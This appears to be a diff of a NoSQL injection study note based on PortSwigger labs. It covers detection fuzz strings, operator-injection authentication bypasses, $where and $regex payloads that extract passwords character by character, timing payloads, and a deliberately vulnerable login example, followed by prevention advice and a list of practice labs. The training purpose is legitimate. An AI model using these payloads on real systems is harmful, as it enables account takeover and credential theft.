@@ -1,15 +1,19 @@
 # NoSQL Injection
 
-Most of these notes were taken from online sources and/or courses. I'm not that smart to come up with all this on my own. The primary source was PortSwigger. Check out their [NoSQL Injection learning path](https://portswigger.net/web-security/learning-paths/nosql-injection) on the Web Security Academy. 
+Most of these notes were taken from online sources and/or courses. I'm not that smart to come up with all this on my own. The primary source was PortSwigger. Check out their [NoSQL Injection learning path](https://portswigger.net/web-security/learning-paths/nosql-injection) on the Web Security Academy.
+
+## Overview
 
 There are two different types of NoSQL injection:
 
-- Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
-- Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.
+- **Syntax injection** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
+- **Operator injection** - This occurs when you can use NoSQL query operators to manipulate queries.
 
-## Sample document
+## Understanding NoSQL Structure
 
-```
+### Sample Document
+
+```json
 {
   "_id": "some_unique_user_id_123",
   "username": "alex_p_dev",
@@ -20,9 +24,9 @@ There are two different types of NoSQL injection:
 }
 ```
 
-## Sample vulnerable code
+### Sample Vulnerable Code
 
-```
+```javascript
 // WARNING: VULNERABLE CODE EXAMPLE
 function login(userInput_username, userInput_password) {
   // Build a query by directly inserting user input
@@ -33,47 +37,51 @@ function login(userInput_username, userInput_password) {
 }
 ```
 
-## Basic Injection Test
+### Basic Injection Test
 
-```
+```json
 { "username": "admin", "password": {"$ne": "a"} }
 ```
 
 The database reads this as: "Find a user where the `username` is 'admin' AND the `password` is **not equal to 'a'**."
 ## Syntax Injection
 
-Attempt to break the query syntax.
+Syntax injection attempts to break the NoSQL query syntax by injecting malicious payloads.
 
-Sample fuzzing string
+### Detection and Fuzzing
+
+#### Sample Fuzzing String
 
 ```
 '"`{ ;$Foo} $Foo \xYZ
 ```
 
-Using this string -- URL-encoded
+#### URL-Encoded Fuzzing
 
 ```
 https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
 ```
 
-If injecting into the JSON context, it would be:
+#### JSON Context Fuzzing
 
 ```
 '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
 ```
 
 !!! tip
-	To figure out which characters are processed, send individuals characters to see how the application responds.
+	To figure out which characters are processed, send individual characters to see how the application responds.
 
-### Confirm Conditional Behavior
+### Confirming Conditional Behavior
 
 After identifying the vulnerability, try to determine which characters are being processed.
 
-Examples
+#### Testing False Conditions
 
 ```
 ' && 0 && 'x
 ```
+
+#### Testing True Conditions
 
 ```
 ' && 1 && 'x
@@ -81,9 +89,11 @@ Examples
 
 If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.
 
-### Override Existing Conditions
+### Exploiting Syntax Injection
 
-Attempt to override existing conditions with custom javascript
+#### Override Existing Conditions
+
+Attempt to override existing conditions with custom JavaScript:
 
 ```
 '||'1'=='1
@@ -92,7 +102,9 @@ Attempt to override existing conditions with custom javascript
 !!! warning
     Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.
 
-Try injecting a null character after the query
+#### Null Character Injection
+
+Try injecting a null character after the query:
 
 ```
 https://insecure-website.com/product/lookup?category=fizzy'%00
@@ -227,7 +239,7 @@ NoSQL databases often use query operators, which provide ways to specify conditi
 - `$where`: This is a very dangerous one. In older versions of MongoDB, it allowed you to pass a JavaScript function to be executed on the server. Finding this is like hitting the jackpot.
 - `$exists`: This checks if a field exists or not, which can be useful for figuring out the database schema.
 
-### Interpreting Responses
+### Response Analysis
 
 Sending the payload is only half the battle. A professional pentester needs to carefully observe how the application responds to confirm a vulnerability. You're looking for three main types of clues:
 
@@ -237,29 +249,35 @@ Sending the payload is only half the battle. A professional pentester needs to c
     
 3. **Time-Based (Blind):** This is the most advanced technique. What if the application doesn't change its content or show errors? You can inject a command that tells the database to "sleep" or perform a heavy computation _if_ a certain condition is true. If you inject a payload that says, "If the admin's password starts with 'a', sleep for 5 seconds," and the page takes 5 seconds longer to load, you've just learned the first letter of the password. This is called **blind injection**.
 
-### Sending in GET
+### Basic Operator Injection Techniques
 
-Something like this might work in a URL
+#### GET Parameter Injection
+
+Something like this might work in a URL:
 
 ```
 username[$ne]=invalid
 ```
 
+#### POST JSON Injection
+
 We can also change GET to POST, and then inject into the body with `Content-Type: application/json`
 
-In the JSON body, test whether the username (example) input is processing the query operator
+In the JSON body, test whether the username (example) input is processing the query operator:
 
-```
+```json
 {"username":{"$ne":"invalid"},"password":"peter"}
 ```
 
 If the `$ne` operator is applied, then it will query all accounts that do NOT have the username "invalid"
 
+#### Authentication Bypass
+
 This could be used to bypass authentication if both the username and password fields process the operator. 
 
 We can check a list of known usernames:
 
-```
+```json
 {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
 ```
 
@@ -334,21 +352,10 @@ We can check a list of known usernames:
 	    'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'
 	```
 
-## Exfiltrating Data
 
-If the query is using a `$where` clause, we can try to inject into that to retrieve sensitive data
+## Data Extraction Techniques
 
-```
-admin' && this.password[0] == 'a' || 'a'=='b
-```
-
-or using the JavaScript `match()` function:
-
-```
-admin' && this.password.match(/\d/) || 'a'=='b
-```
-
-## Identifying Field Names
+### Identifying Field Names
 
 It can be difficult to identify field names since NoSQL doesn't require a fixed schema (like SQL), but we can usually infer the existence of a field by the responses:
 
@@ -356,16 +363,34 @@ It can be difficult to identify field names since NoSQL doesn't require a fixed 
 https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
 ```
 
-Comparing against a known:
+Comparing against a known field:
 
 ```
 admin' && this.username!='
 ```
 
-and an unknown
+and an unknown field:
 
 ```
 admin' && this.foo!='
+```
+
+### Extracting Data with Syntax Injection
+
+If the query is using a `$where` clause, we can try to inject into that to retrieve sensitive data:
+
+#### Character-by-Character Extraction
+
+```
+admin' && this.password[0] == 'a' || 'a'=='b
+```
+
+#### Using JavaScript Functions
+
+Using the JavaScript `match()` function:
+
+```
+admin' && this.password.match(/\d/) || 'a'=='b
 ```
 
 ??? example "PortSwigger NoSQL Injection Lab 3: Exploiting NoSQL injection to extract data"
@@ -451,38 +476,38 @@ admin' && this.foo!='
 	
 	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727105503.png)
 
-## Additional operator injection
+### Advanced Operator Injection
 
-Using `$where` to confirm injection
+#### Using `$where` to Confirm Injection
 
-```
+```json
 {"username":"wiener","password":"peter", "$where":"0"}
 ```
 
-```
+```json
 {"username":"wiener","password":"peter", "$where":"1"}
 ```
 
 If there's a difference, it could mean the JavaScript in the `$where` clause is being evaluated.
 
-#### Extracting field names with `keys()`
+#### Extracting Field Names with `keys()`
 
-```
-"$where":"Object.keys(this)[0].match('^.{0}a.*')"
-```
-
-#### Exfiltrating data using operators
-
-```
-`{"username":"admin","password":{"$regex":"^.*"}}`
+```json
+{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
 ```
 
-	!!! tip "Confirming injection with $regex"
-	If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:
-	
-	```
-	{"username":"admin","password":{"$regex":"^a*"}}
-	```
+#### Data Exfiltration with Operators
+
+```json
+{"username":"admin","password":{"$regex":"^.*"}}
+```
+
+!!! tip "Confirming injection with $regex"
+    If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:
+    
+    ```json
+    {"username":"admin","password":{"$regex":"^a*"}}
+    ```
 
 ??? example "PortSwigger NoSQL Injection Lab 4: Exploiting NoSQL operator injection to extract unknown fields"
 
@@ -617,19 +642,27 @@ If there's a difference, it could mean the JavaScript in the `$where` clause is 
 	After resetting the password we can log in as carlos and solve the lab
 	
 	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727144654.png)
+
 	
+## Timing-Based Attacks (Blind Injection)
 
-## Timing-based attacks
+Timing-based attacks are useful when the application doesn't return different content or show error messages. You can trigger a time delay under certain conditions to extract data.
 
-Trigger a time delay under certain conditions
+### Basic Timing Payloads
 
-```
+#### Using `while` Loop for Delays
+
+```javascript
 admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
 ```
 
-```
+#### Using `sleep` Function
+
+```javascript
 admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 ```
+
+These payloads will cause a 5-second delay if the first character of the password is "a", allowing you to extract data character by character.
 ## Prevention
 
 - **Strict Input Validation (Whitelisting):** This is the single most important defense. The application should never trust user input. Instead of trying to remove bad characters (**blacklisting**), it's far safer to only allow known good characters (**whitelisting**). More importantly, the code should perform **type-checking**. If the application expects a username (a string), it should reject any input that is an object (like `{"$ne": null}`). If it expects an age (a number), it should reject strings.
@@ -639,38 +672,31 @@ admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 - **Principle of Least Privilege:** The user account that the web application uses to connect to the database should have the minimum permissions necessary. For example, if a part of your application only needs to **read** user profiles, its database account shouldn't have permission to **delete** them. This won't prevent an injection, but it dramatically limits the damage an attacker can do if they find one.
 
 ---
-# Resources
+
+## Practice Resources
 
 Here are 4 excellent and free resources where you can safely and legally practice NoSQL injection. Most of these are easily run locally using Docker.
 
-1. **OWASP Juice Shop**
-    
-    - **What it is:** This is probably the most popular modern web application for security training. It's an intentionally insecure web shop full of vulnerabilities, including several NoSQL injection challenges. The challenges range from basic login bypasses to more advanced data exfiltration.
-        
-    - **Why it's great:** It puts the vulnerabilities in the context of a real-world application. You have to find the vulnerable input fields first before you can exploit them.
-        
-    - **How to get it:** It has an official Docker image that is incredibly easy to run. Just search for `owasp/juice-shop` on Docker Hub or follow the simple instructions on their official site.
-        
-2. **PortSwigger Web Security Academy**
-    
-    - **What it is:** This is a free, online learning platform created by the makers of Burp Suite. It provides dozens of high-quality, interactive labs that target specific vulnerabilities.
-        
-    - **Why it's great:** Their NoSQL injection labs are fantastic. They walk you through detecting the vulnerability, bypassing logins, and even exploiting syntax variations. It's all browser-based, so there's no local setup required.
-        
-    - **How to get it:** Simply register for a free account on the [PortSwigger website](https://portswigger.net/web-security) to get access to all the labs.
-        
-3. **NoSQLGoat**
-    
-    - **What it is:** This is a project from OWASP specifically designed to be a vulnerable-by-design application for learning NoSQL injection. It's less of a broad "find the vulnerability" game and more of a focused shooting range for NoSQLi.
-        
-    - **Why it's great:** It's hyper-focused on our topic. It covers a wide variety of injection types and scenarios related to MongoDB.
-        
-    - **How to get it:** It's available on GitHub and can be easily deployed using the provided Docker instructions.
-        
-4. **Hack The Box & TryHackMe**
-    
-    - **What they are:** These are online platforms where you can hack into retired, realistic machines in a CTF (Capture The Flag) style. They aren't just single web apps, but often entire virtual machines with multiple services.
-        
-    - **Why they're great:** They provide the most realistic practice. You'll find NoSQL injection vulnerabilities as part of a larger chain of exploitation needed to compromise a system. Many retired machines and dedicated learning "rooms" on these platforms feature NoSQLi.
-        
-    - **How to get it:** Both platforms operate on a "freemium" model. You can access many retired machines and learning paths for free, with an optional subscription for more content.
+### 1. OWASP Juice Shop
+
+- **What it is:** This is probably the most popular modern web application for security training. It's an intentionally insecure web shop full of vulnerabilities, including several NoSQL injection challenges. The challenges range from basic login bypasses to more advanced data exfiltration.
+- **Why it's great:** It puts the vulnerabilities in the context of a real-world application. You have to find the vulnerable input fields first before you can exploit them.
+- **How to get it:** It has an official Docker image that is incredibly easy to run. Just search for `owasp/juice-shop` on Docker Hub or follow the simple instructions on their official site.
+
+### 2. PortSwigger Web Security Academy
+
+- **What it is:** This is a free, online learning platform created by the makers of Burp Suite. It provides dozens of high-quality, interactive labs that target specific vulnerabilities.
+- **Why it's great:** Their NoSQL injection labs are fantastic. They walk you through detecting the vulnerability, bypassing logins, and even exploiting syntax variations. It's all browser-based, so there's no local setup required.
+- **How to get it:** Simply register for a free account on the [PortSwigger website](https://portswigger.net/web-security) to get access to all the labs.
+
+### 3. NoSQLGoat
+
+- **What it is:** This is a project from OWASP specifically designed to be a vulnerable-by-design application for learning NoSQL injection. It's less of a broad "find the vulnerability" game and more of a focused shooting range for NoSQLi.
+- **Why it's great:** It's hyper-focused on our topic. It covers a wide variety of injection types and scenarios related to MongoDB.
+- **How to get it:** It's available on GitHub and can be easily deployed using the provided Docker instructions.
+
+### 4. Hack The Box & TryHackMe
+
+- **What they are:** These are online platforms where you can hack into retired, realistic machines in a CTF (Capture The Flag) style. They aren't just single web apps, but often entire virtual machines with multiple services.
+- **Why they're great:** They provide the most realistic practice. You'll find NoSQL injection vulnerabilities as part of a larger chain of exploitation needed to compromise a system. Many retired machines and dedicated learning "rooms" on these platforms feature NoSQLi.
+- **How to get it:** Both platforms operate on a "freemium" model. You can access many retired machines and learning paths for free, with an optional subscription for more content.
